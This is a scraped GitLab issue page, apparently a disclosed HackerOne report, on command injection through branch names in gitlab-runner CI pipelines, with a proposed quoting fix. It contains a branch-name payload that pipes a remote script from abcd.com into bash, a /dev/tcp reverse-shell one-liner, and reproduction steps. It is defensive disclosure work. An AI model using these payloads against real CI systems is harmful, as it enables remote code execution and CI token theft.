data-sourcepos=\&quot;112:4-112:30\&quot;\u003eCreate branch named \u003ccode data-sourcepos=\&quot;112:25-112:29\&quot;\u003e$(id)\u003c/code\u003e\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;113:1-113:19\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;113:4-113:19\&quot;\u003eSetup a pipeline\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;114:1-122:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;114:4-114:35\&quot;\u003eObserve this in the build output\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;116:5-121:7\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eFetching changes with git depth set to 50...\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eInitialized empty Git repository in /builds/dcouture/private_project/.git/\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eCreated fresh repository.\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003efatal: invalid refspec &#39;+refs/heads/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video):refs/remotes/origin/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)&#39;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;125:1-125:11\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-proposal\&quot; class=\&quot;anchor\&quot; href=\&quot;#proposal\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eProposal\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;127:1-127:481\&quot; dir=\&quot;auto\&quot;\u003eThe problem happens because all command arguments are double-quoted in \u003ccode data-sourcepos=\&quot;127:73-127:83\&quot;\u003eShellWriter\u003c/code\u003e-derived classes (Windows Batch is a different case that requires a different solution). In this particular scenario, the command in question is constructed in \u003ca data-sourcepos=\&quot;127:245-127:394\&quot; href=\&quot;http://gitlab.com/gitlab-org/gitlab-runner/blob/e25e39c60cee7ab0be55af6a1575262f3fcfd64b/shells/abstract.go#L368\&quot;\u003eAbstractShell.writeRefspecFetchCmd\u003c/a\u003e. As shown by this issue, double-quoting all arguments is an unsafe default. We should:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;129:1-130:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;129:1-130:0\&quot;\u003erename the current \u003ccode data-sourcepos=\&quot;129:24-129:30\&quot;\u003eCommand\u003c/code\u003e method in the \u003ccode data-sourcepos=\&quot;129:48-129:58\&quot;\u003eShellWriter\u003c/code\u003e interface to e.g. \u003ccode data-sourcepos=\&quot;129:80-129:102\&quot;\u003eCommandWithArgExpansion\u003c/code\u003e, and add a new \u003ccode data-sourcepos=\&quot;129:121-129:127\&quot;\u003eCommand\u003c/code\u003e method which would write the command in such a way that it would not expand arguments (normally this would be done by single-quoting them instead of double-quoting).\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;131:3-146:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;131:3-142:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;131:5-131:108\&quot;\u003ein \u003ccode data-sourcepos=\&quot;131:9-131:12\&quot;\u003ebash\u003c/code\u003e and \u003ccode data-sourcepos=\&quot;131:20-131:23\&quot;\u003epwsh\u003c/code\u003e, this is achieved by quoting arguments with a single-quote instead of double-quote.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;133:5-135:7\&quot; data-canonical-lang=\&quot;shell\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;s2\&quot;\u003e$\&quot;git\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;-c\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;http.userAgent=gitlab-runner development version darwin/amd64\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;fetch\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;origin\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;+refs/heads/\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e$(\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003eid\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e)\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e:refs/remotes/origin/\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e$(\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003eid\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e)\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;--depth\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;50\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;--prune\&quot;\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;--quiet\&quot;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;137:5-137:11\&quot;\u003ebecomes\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;139:5-141:7\&quot; data-canonical-lang=\&quot;shell\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;s1\&quot;\u003e$&#39;git&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;-c&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;http.userAgent=gitlab-runner development version darwin/amd64&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;fetch&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;origin&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;+refs/heads/$(id):refs/remotes/origin/$(id)&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;--depth&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;50&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;--prune&#39;\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;--quiet&#39;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;143:3-146:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;143:5-143:58\&quot;\u003ein \u003ccode data-sourcepos=\&quot;143:9-143:11\&quot;\u003ecmd\u003c/code\u003e, this is achieved by replacing \u003ccode data-sourcepos=\&quot;143:46-143:46\&quot;\u003e%\u003c/code\u003e with \u003ccode data-sourcepos=\&quot;143:55-143:56\&quot;\u003e%^\u003c/code\u003e:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;145:5-145:65\&quot;\u003e\u003ca class=\&quot;no-attachment-icon gfm\&quot; href=\&quot;/-/project/250833/uploads/5e61bc75b987b5b79f357e414b04b699/image.png\&quot; target=\&quot;_blank\&quot; rel=\&quot;noopener noreferrer\&quot; data-canonical-src=\&quot;/uploads/5e61bc75b987b5b79f357e414b04b699/image.png\&quot; data-link=\&quot;true\&quot;\u003e\u003cimg data-sourcepos=\&quot;145:5-145:65\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;image\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy gfm\&quot; data-src=\&quot;/-/project/250833/uploads/5e61bc75b987b5b79f357e414b04b699/image.png\&quot; data-canonical-src=\&quot;/uploads/5e61bc75b987b5b79f357e414b04b699/image.png\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;147:1-149:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;147:1-147:128\&quot;\u003eadd tests for the new \u003ccode data-sourcepos=\&quot;147:27-147:33\&quot;\u003eCommand\u003c/code\u003e implementation in \u003ccode data-sourcepos=\&quot;147:55-147:65\&quot;\u003eShellWriter\u003c/code\u003e-derived classes to ensure that known expansions are thwarted.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;148:1-149:0\&quot;\u003eIdeally, we&#39;d review all commands that shouldn&#39;t need argument expansion and have them be created with \u003ccode data-sourcepos=\&quot;148:108-148:114\&quot;\u003eCommand\u003c/code\u003e instead of \u003ccode data-sourcepos=\&quot;148:129-148:151\&quot;\u003eCommandWithArgExpansion\u003c/code\u003e.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;150:1-150:98\&quot; dir=\&quot;auto\&quot;\u003eOnce this is done, a \u003ccode data-sourcepos=\&quot;150:23-150:26\&quot;\u003ebash\u003c/code\u003e job on a branch called \u003ccode data-sourcepos=\&quot;150:53-150:57\&quot;\u003e$(id)\u003c/code\u003e no longer fails or exposes information:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;152:1-152:61\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon gfm\&quot; href=\&quot;/-/project/250833/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png\&quot; target=\&quot;_blank\&quot; rel=\&quot;noopener noreferrer\&quot; data-canonical-src=\&quot;/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png\&quot; data-link=\&quot;true\&quot;\u003e\u003cimg data-sourcepos=\&quot;152:1-152:61\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;image\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy gfm\&quot; data-src=\&quot;/-/project/250833/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png\&quot; data-canonical-src=\&quot;/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;154:1-154:61\&quot; dir=\&quot;auto\&quot;\u003eSame thing for a \u003ccode data-sourcepos=\&quot;154:19-154:22\&quot;\u003epwsh\u003c/code\u003e job on a branch called \u003ccode data-sourcepos=\&quot;154:49-154:59\&quot;\u003e$(Get-Host)\u003c/code\u003e:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;156:1-156:61\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon gfm\&quot; href=\&quot;/-/project/250833/uploads/9fb68e0ea6e55589588a149012075b91/image.png\&quot; target=\&quot;_blank\&quot; rel=\&quot;noopener noreferrer\&quot; data-canonical-src=\&quot;/uploads/9fb68e0ea6e55589588a149012075b91/image.png\&quot; data-link=\&quot;true\&quot;\u003e\u003cimg data-sourcepos=\&quot;156:1-156:61\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;image\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy gfm\&quot; data-src=\&quot;/-/project/250833/uploads/9fb68e0ea6e55589588a149012075b91/image.png\&quot; data-canonical-src=\&quot;/uploads/9fb68e0ea6e55589588a149012075b91/image.png\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;158:1-158:101\&quot; dir=\&quot;auto\&quot;\u003eA PoC MR is located \u003ca href=\&quot;https://gitlab.com/gitlab-org/security/gitlab-runner/-/merge_requests/25\&quot;\u003ehere\u003c/a\u003e.\u003c/p\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;## Status Report (revised: 2022-08-xx)\n\n{placeholder}\n\n**[HackerOne report #1063511](https://hackerone.com/reports/1063511)** by `stanlyoncm` on 2020-12-21, assigned to @dcouture:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\nBranch names are interpreted by the shell so you can inject commands. Someone could create a branch named `$(curl${IFS}abcd.com|bash)` and host a script on that custom domain that would abuse the `CI_JOB_TOKEN`. You&#39;d need then to get someone to contribute to your MR which borders on social engineering but you could do it by getting someone to Apply Suggestion and hope they don&#39;t pay attention to the odd branch name. This is also, and perhaps more importantly, related to the efforts in https://gitlab.com/gitlab-org/gitlab/-/issues/295234\n\n\u003cdetails\u003e\n\u003csummary\u003e\nOriginal report in spanish\n\u003c/summary\u003e\n\n## Report\n\n==Report in Spanish:==\n\n#####  Summary\n\nDebido a que el nombre de una rama permite algunos __caracteres especiales__, un atacante *(desarrollador)* es capaz de ejecutar __código a nivel de sistema__ en un servidor que este ejecutando __gilab-runner__ para las canalizaciones de un proyecto.\n\nEl atacante que empuja una rama con nombre __$CI_DEFAULT_BRANCH\\`${c}\\`__ , es capaz luego de ejecutar una canalización a través de la interfaz de gitlab.com, estableciendo como valor de __“c”__ un comando a nivel de sistema.\n\nLo que hace interesante a este ataque es que, no es necesaria la creación o modificación de ningún archivo del proyecto mientras se envía el trabajo a la canalización, por ejemplo `.gitlab-ci.yml`, lo que indiciaria una posible acción maliciosa por parte de quien envía el trabajo.\n\nEl trabajo no dejara rastros de haber ejecutado algún comando en el servidor, ya que, el atacante debe redirigir la salida del comando hacia `/dev/null`,  además, el comando es ejecutado como producto de haber sido concatenado con el nombre de la rama a través de una variable de entorno.\n\nPara la prueba de concepto, realice las pruebas bajo un entorno controlado ejecutando un corredor con un ejecutor __“”shell””__ y enviando un único trabajo que imprime un mensaje al finalizar. Luego al ejecutar una canalización desde la interfaz web y asignar un comando a nivel de sistema al valor de la variable de entorno __“c”__, pude obtener una conexión inversa mediante el siguiente comando.  \n```bash  \n(exec 5\u0026lt;\u0026gt;/dev/tcp/172.17.0.2/4444 \u0026amp;\u0026amp; while read line 0\u0026lt;\u0026amp;5;do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5;done \u0026amp;) \u0026amp;\u0026gt;/dev/null  \n```  \nCabe destacar que yo he inyectado el comando anterior para demostrar el impacto que tendría esta vulnerabilidad en el servidor victima al ser tomando por un atacante, logrando incluso la persistencia en el sistema aun cuando el trabajo es eliminado o borrado, además he realizado un prueba de concepto en video que adjuntare con el reporte, sin embargo en los pasos para reproducir este problema, usted ejecutara el comando `hostname `en el sistema.  \n \n   \n#####  Steps to reproduce\n\n__[Preparación]__\n\n__1)__ Ingrese a Gitlab.com\n\n__2)__ Cree un proyecto nuevo.\n\n__3)__ Ejecute gitlab-runner en un servidor bajo su control.\n\n__4)__ Registre un corredor para su proyecto *(para este informe yo he elegido el ejecutor shell)*.\n\n__5)__ Cree un archivo valido `.gitlab-ci.yml`, y registre el corredor para el proyecto.\n\n__6)__ Invite un nuevo miembro con permisos de desarrollador.  \n \n   \n__[Flujo del ataque]__ *(miembro invitado con permisos de desarrollador)*\n\n__1)__ Cree una rama con el siguiente nombre  __$CI_DEFAULT_BRANCH\\`${c}\\`__\n\n__2)__ Ingrese a `https://gitlab.com/\u0026lt;user\u0026gt;/\u0026lt;project\u0026gt;/-/pipelines/new` y seleccione la rama __$CI_DEFAULT_BRANCH\\`${c}\\`__ para ejecutar una nueva canalización.\n\n__3)__ Cree la variable de nombre `c` con el valor `eval hostname` \n\n__4)__ Ejecute la canalización.\n\nComo resultado de esto el trabajo fallara ya que no redirigió la salida del comando al `/dev/null` o no envió el comando a segundo plano.\n\nObtendrá el siguiente mensaje al finalizar el trabajo:\n\n`fatal: couldn\u0026#39;t find remote ref refs/heads/master\u0026lt;hostname\u0026gt;`\n\nObtendrá el resultando del comando junto a la referencia remota `master`, lo que indica que ha ejecutado un comando el el servidor de la victima.  \n \n   \n#####  What is the current *bug* behavior?  \n \nEl nombre de la rama permite concatenar un comando a nivel de sistema que será ejecutado al momento de enviar una canalización.  \n \n   \n#####  What is the expected *correct* behavior?\n\nSe debe evaluar el nombre de la rama como una cadena de caracteres al momento de ejecutar una canalización.  \n \n   \n#####  Relevant logs and/or screenshots\n\nEn este video de prueba de concepto, se omiten los pasos de __[Preparación]__\n\n![poc.mp4](https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4)  \n \n   \n#####  Output of checks\n\nThis bug happens on GitLab.com  \n \n \n\n####  Impact\n\nSe puede ejecutar código arbitrario a nivel de sistema en ejecuciones CI, con tan solo enviar una nueva rama al proyecto y ejecutar una canalización, esto, sin modificar o crear ningún archivo que indique la acción mal intencionada por parte del atacante, debido a esto este ataque puede ser aun mas peligroso si se ejecutan las compilaciones en servidores de confianza ya que, como dije anteriormente no es necesaria la modificación de ningún archivo y además, no se crean registros de logs sobre la salida de algún comando enviado por el atacante.\n\n\u003c/details\u003e\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [poc.mp4](https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1. Create branch named `$(id)`\n1. Setup a pipeline\n1. Observe this in the build output\n\n    ```\n    Fetching changes with git depth set to 50...\n    Initialized empty Git repository in /builds/dcouture/private_project/.git/\n    Created fresh repository.\n    fatal: invalid refspec &#39;+refs/heads/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video):refs/remotes/origin/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)&#39;\n    ```\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\n\n## Proposal\n\nThe problem happens because all command arguments are double-quoted in `ShellWriter`-derived classes (Windows Batch is a different case that requires a different solution). In this particular scenario, the command in question is constructed in [AbstractShell.writeRefspecFetchCmd](http://gitlab.com/gitlab-org/gitlab-runner/blob/e25e39c60cee7ab0be55af6a1575262f3fcfd64b/shells/abstract.go#L368). As shown by this issue, double-quoting all arguments is an unsafe default. We should:\n\n1. rename the current `Command` method in the `ShellWriter` interface to e.g. `CommandWithArgExpansion`, and add a new `Command` method which would write the command in such a way that it would not expand arguments (normally this would be done by single-quoting them instead of double-quoting).\n\n  - in `bash` and `pwsh`, this is achieved by quoting arguments with a single-quote instead of double-quote.\n\n    ```shell\n    $\&quot;git\&quot; \&quot;-c\&quot; \&quot;http.userAgent=gitlab-runner development version darwin/amd64\&quot; \&quot;fetch\&quot; \&quot;origin\&quot; \&quot;+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606\&quot; \&quot;+refs/heads/$(id):refs/remotes/origin/$(id)\&quot; \&quot;--depth\&quot; \&quot;50\&quot; \&quot;--prune\&quot; \&quot;--quiet\&quot;\n    ```\n    \n    becomes\n    \n    ```shell\n    $&#39;git&#39; &#39;-c&#39; &#39;http.userAgent=gitlab-runner development version darwin/amd64&#39; &#39;fetch&#39; &#39;origin&#39; &#39;+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606&#39; &#39;+refs/heads/$(id):refs/remotes/origin/$(id)&#39; &#39;--depth&#39; &#39;50&#39; &#39;--prune&#39; &#39;--quiet&#39;\n    ```\n\n  - in `cmd`, this is achieved by replacing `%` with `%^`:\n\n    ![image](/uploads/5e61bc75b987b5b79f357e414b04b699/image.png)\n\n1. add tests for the new `Command` implementation in `ShellWriter`-derived classes to ensure that known expansions are thwarted.\n1. Ideally, we&#39;d review all commands that shouldn&#39;t need argument expansion and have them be created with `Command` instead of `CommandWithArgExpansion`.\n\nOnce this is done, a `bash` job on a branch called `$(id)` no longer fails or exposes information:\n\n![image](/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png)\n\nSame thing for a `pwsh` job on a branch called `$(Get-Host)`:\n\n![image](/uploads/9fb68e0ea6e55589588a149012075b91/image.png)\n\nA PoC MR is located [here](https://gitlab.com/gitlab-org/security/gitlab-runner/-/merge_requests/25).&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;gitlab-org/gitlab-runner&quot;,&quot;iid&quot;:27386,&quot;issuableId&quot;:76597290,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2741139,&quot;authorName&quot;:&quot;GitLab SecurityBot&quot;,&quot;authorUsername&quot;:&quot;gitlab-securitybot&quot;,&quot;authorWebUrl&quot;:&quot;/gitlab-securitybot&quot;,&quot;createdAt&quot;:&quot;2020-12-30T20:40:19+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:250833,&quot;projectPath&quot;:&quot;gitlab-runner&quot;,&quot;projectNamespace&quot;:&quot;gitlab-org&quot;,&quot;updatedAt&quot;:&quot;2022-08-23T15:21:50+00:00&quot;,&quot;updatedBy&quot;:{&quot;name&quot;:&quot;Darren Eastman&quot;,&quot;path&quot;:&quot;/DarrenEastman&quot;},&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">Command injection via branch name in CI pipelines.</h1>
</div>
<div class="description">
<div class="md"><h2 data-sourcepos="1:1-1:38" dir="auto">&#x000A;<a id="user-content-status-report-revised-2022-08-xx" class="anchor" href="#status-report-revised-2022-08-xx" aria-hidden="true"></a>Status Report (revised: 2022-08-xx)</h2>&#x000A;<p data-sourcepos="3:1-3:13" dir="auto">{placeholder}</p>&#x000A;<p data-sourcepos="5:1-5:124" dir="auto"><strong data-sourcepos="5:1-5:70"><a data-sourcepos="5:3-5:68" href="https://hackerone.com/reports/1063511" rel="nofollow noreferrer noopener" target="_blank">HackerOne report #1063511</a></strong> by <code data-sourcepos="5:76-5:85">stanlyoncm</code> on 2020-12-21, assigned to <a href="/dcouture" data-reference-type="user" data-user="4992072" data-container="body" data-placement="top" class="gfm gfm-project_member js-user-link" title="Dominic Couture">@dcouture</a>:</p>&#x000A;<p data-sourcepos="7:1-7:87" dir="auto"><a data-sourcepos="7:1-7:17" href="#report">Report</a> | <a data-sourcepos="7:21-7:47" href="#attachments">Attachments</a> | <a data-sourcepos="7:51-7:87" href="#how-to-reproduce">How To Reproduce</a></p>&#x000A;<p data-sourcepos="9:1-9:543" dir="auto">Branch names are interpreted by the shell so you can inject commands. Someone could create a branch named <code data-sourcepos="9:108-9:133">$(curl${IFS}abcd.com|bash)</code> and host a script on that custom domain that would abuse the <code data-sourcepos="9:198-9:209">CI_JOB_TOKEN</code>. You'd need then to get someone to contribute to your MR which borders on social engineering but you could do it by getting someone to Apply Suggestion and hope they don't pay attention to the odd branch name. This is also, and perhaps more importantly, related to the efforts in <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/295234" data-reference-type="issue" data-original="https://gitlab.com/gitlab-org/gitlab/-/issues/295234" data-link="false" data-link-reference="true" data-project="278964" data-issue="76351781" data-project-path="gitlab-org/gitlab" data-iid="295234" data-issue-type="issue" data-container="body" data-placement="top" title="Make it possible to prevent non-maintainer users from defining CI variables" class="gfm gfm-issue">gitlab#295234 (closed)</a></p>&#x000A;<details>&#x000A;<summary>&#x000A;Original report in spanish&#x000A;</summary>&#x000A;<h2 data-sourcepos="16:1-16:9">&#x000A;<a id="user-content-report" class="anchor" href="#report" aria-hidden="true"></a>Report</h2>&#x000A;<p data-sourcepos="18:1-18:22">==Report in Spanish:==</p>&#x000A;<h5 data-sourcepos="20:1-20:14">&#x000A;<a id="user-content-summary" class="anchor" href="#summary" aria-hidden="true"></a>Summary</h5>&#x000A;<p data-sourcepos="22:1-22:251">Debido a que el nombre de una rama permite algunos <strong data-sourcepos="22:52-22:76">caracteres especiales</strong>, un atacante <em data-sourcepos="22:91-22:107">(desarrollador)</em> es capaz de ejecutar <strong data-sourcepos="22:130-22:159">código a nivel de sistema</strong> en un servidor que este ejecutando <strong data-sourcepos="22:196-22:211">gilab-runner</strong> para las canalizaciones de un proyecto.</p>&#x000A;<p data-sourcepos="24:1-24:231">El atacante que empuja una rama con nombre <strong data-sourcepos="24:44-24:73"><code data-math-style="inline" class="code math js-render-math">CI_DEFAULT_BRANCH`</code>{c}`</strong> , es capaz luego de ejecutar una canalización a través de la interfaz de gitlab.com, estableciendo como valor de <strong data-sourcepos="24:190-24:200">“c”</strong> un comando a nivel de sistema.</p>&#x000A;<p data-sourcepos="26:1-26:288">Lo que hace interesante a este ataque es que, no es necesaria la creación o modificación de ningún archivo del proyecto mientras se envía el trabajo a la canalización, por ejemplo <code data-sourcepos="26:187-26:200">.gitlab-ci.yml</code>, lo que indiciaria una posible acción maliciosa por parte de quien envía el trabajo.</p>&#x000A;<p data-sourcepos="28:1-28:291">El trabajo no dejara rastros de haber ejecutado algún comando en el servidor, ya que, el atacante debe redirigir la salida del comando hacia <code data-sourcepos="28:144-28:152">/dev/null</code>,  además, el comando es ejecutado como producto de haber sido concatenado con el nombre de la rama a través de una variable de entorno.</p>&#x000A;<p data-sourcepos="30:1-30:415">Para la prueba de concepto, realice las pruebas bajo un entorno controlado ejecutando un corredor con un ejecutor <strong data-sourcepos="30:115-30:135">“”shell””</strong> y enviando un único trabajo que imprime un mensaje al finalizar. Luego al ejecutar una canalización desde la interfaz web y asignar un comando a nivel de sistema al valor de la variable de entorno <strong data-sourcepos="30:336-30:346">“c”</strong>, pude obtener una conexión inversa mediante el siguiente comando.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="31:1-33:5" data-canonical-lang="bash" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell"><span class="o">(</span><span class="nb">exec </span>5&amp;lt<span class="p">;</span>&amp;gt<span class="p">;</span>/dev/tcp/172.17.0.2/4444 &amp;amp<span class="p">;</span>&amp;amp<span class="p">;</span> <span class="k">while </span><span class="nb">read </span>line 0&amp;lt<span class="p">;</span>&amp;amp<span class="p">;</span>5<span class="p">;</span><span class="k">do</span> <span class="nv">$line</span> 2&amp;gt<span class="p">;</span>&amp;amp<span class="p">;</span>5 &amp;gt<span class="p">;</span>&amp;amp<span class="p">;</span>5<span class="p">;</span><span class="k">done</span> &amp;amp<span class="p">;</span><span class="o">)</span> &amp;amp<span class="p">;</span>&amp;gt<span class="p">;</span>/dev/null  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="34:1-36:4">Cabe destacar que yo he 